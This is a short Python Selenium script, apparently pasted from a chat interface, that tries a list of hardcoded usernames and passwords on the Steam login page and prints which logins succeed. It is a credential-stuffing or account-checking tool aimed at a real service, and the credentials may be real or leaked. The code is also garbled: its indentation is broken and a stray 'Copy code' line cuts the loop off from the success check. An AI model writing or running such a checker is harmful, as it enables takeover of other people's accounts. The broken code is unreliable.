import selenium
from selenium import webdriver

#create list of usernames and passwords
usernames = ["its_talesd", "hjgyjgygy", "hypapumynany"]
passwords = ["HvfnvSL2", "Ezxpl8Ub", "DnE1OGBq"]

#open web browser and navigate to Steam login page
browser = webdriver.Chrome()
browser.get("https://store.steampowered.com/login/")

#iterate through usernames and passwords and attempt login
        for username, password in zip(usernames, passwords):
        browser.find_element_by_id("input_username").send_keys(username)
        browser.find_element_by_id("input_password").send_keys(password)
        browser.find_element_by_id("login_btn_signin").click()

Copy code
#check if login was successful
if "Login" not in browser.title:
    print(f"Successfully logged in with username: {username} and password: {password}")
else:
    print(f"Failed to log in with username: {username} and password: {password}")

#navigate back to login page for next iteration
browser.get("https://store.steampowered.com/login/")
#close browser
browser.close()